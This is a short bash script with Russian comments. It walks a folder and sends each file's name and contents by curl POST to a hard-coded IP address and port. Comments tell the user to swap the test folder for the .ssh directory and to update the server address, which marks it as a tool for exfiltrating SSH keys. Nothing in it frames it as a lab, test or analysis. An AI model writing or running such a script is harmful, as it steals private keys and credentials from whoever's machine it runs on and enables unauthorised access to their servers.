#!/bin/bash

FOLDER="$HOME/yadro/tests" # ПОДМЕНИТЬ НА .ssh !!!
SERVER="172.20.10.9:4042" # ЗАМЕНИТЬ НА АДРЕС АКТУАЛЬНЫЙ !!!

if [ ! -d "$FOLDER" ]; then 
    exit 1
    echo "no folder"
 fi

process_file() { 
    local file="$1" 
    local filename=$(basename "$file") 
    local content
    
    content=$(< "$file" sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' -e 's/\$/\\$/g')
    
    echo "\"$filename\":\"$content\""
}

find "$FOLDER" -type f -print0 | while IFS= read -r -d $'\0' file; do

    data=$(process_file "$file")
    
    echo "sending.."
    curl -X POST "$SERVER" -d "$data" --silent
    
done
